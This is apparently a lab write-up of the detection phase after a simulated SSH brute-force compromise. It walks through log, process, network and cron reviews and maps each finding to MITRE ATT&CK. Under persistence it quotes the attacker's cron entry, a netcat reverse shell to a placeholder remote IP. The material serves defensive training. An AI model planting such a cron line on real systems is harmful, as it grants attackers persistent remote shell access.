# Detection

## Overview

After completing the simulated attack, the perspective shifts from attacker to defender.

The objective of this phase is to determine how the compromise could have been detected using available telemetry.

The investigation was performed using:

- journalctl logs
- SSH authentication records
- process information
- network connection data
- packet captures
- Suricata alerts
- Zeek network metadata (where available)

---

# Detection Question

## "What alerted the SOC?"

In a real environment, detection could originate from multiple sources:

- Excessive SSH authentication failures
- Suspicious successful login
- Unexpected privilege escalation
- Suspicious outbound connections
- Unauthorized scheduled tasks

For this simulation, the primary indicators were discovered through manual investigation of collected telemetry.

---

# SSH Authentication Investigation

The first investigation step was reviewing SSH activity.

Command:

```bash
journalctl | grep ssh
```

The investigation revealed:

- Multiple failed SSH authentication attempts
- Successful login using the compromised account
- Source information associated with the SSH session

Evidence:

```
ssh.log
```

Finding:

```
A valid account was successfully used to access the system.
```

Detection Mapping:

| Activity | Detection Source |
|-|-|
| SSH brute force | SSH logs |
| Successful login | journalctl SSH events |

MITRE ATT&CK:

```
T1110.001 - Password Guessing

T1078 - Valid Accounts
```

---

# Process Investigation

After identifying suspicious authentication activity, running processes were reviewed.

Commands:

```bash
ps aux

sudo lsof

ss -tulpn
```

The investigation looked for:

- Unexpected shells
- Suspicious network utilities
- Reverse shell activity
- Unknown processes

Evidence:

```
processes.txt
lsof.txt
network_connections.txt
```

Finding:

A malicious process chain associated with the attacker activity was identified.

---

# Network Investigation

Network activity was reviewed using packet captures and network analysis tools.

Tools:

- Wireshark
- tcpdump
- Zeek
- Suricata

Investigation areas:

- SSH connections
- Unusual outbound connections
- Netcat data transfer
- Reverse shell traffic

Evidence:

```
attack_capture.pcap
```

Findings:

- Attacker communication was identified.
- Data transfer activity was observed.
- Reverse shell behavior was detected.

---

# Persistence Detection

Scheduled tasks were reviewed to identify persistence mechanisms.

Command:

```bash
crontab -l

sudo crontab -l
```

Finding:

A suspicious cron entry was discovered:

```
* * * * * nc -e /bin/sh <remote-ip> 12345
```

This indicated persistence through a scheduled reverse shell.

MITRE ATT&CK:

```
T1053.003 - Scheduled Task/Job: Cron
```

---

# Detection Summary

| Indicator | Evidence | Detection Method |
|-|-|-|
| SSH brute force | ssh.log | Log analysis |
| Valid account compromise | journalctl | Authentication review |
| Root shell | processes.txt | Process investigation |
| Reverse shell | PCAP/lsof | Network analysis |
| Persistence | root_cron.txt | Scheduled task review |

---

# Detection Gaps

The investigation identified several visibility limitations:

- No auditd execution telemetry was available.
- Command execution history was limited.
- Endpoint monitoring was minimal.

Recommended improvements:

- Deploy auditd rules.
- Add centralized logging.
- Deploy EDR capabilities.
- Forward telemetry to a SIEM platform.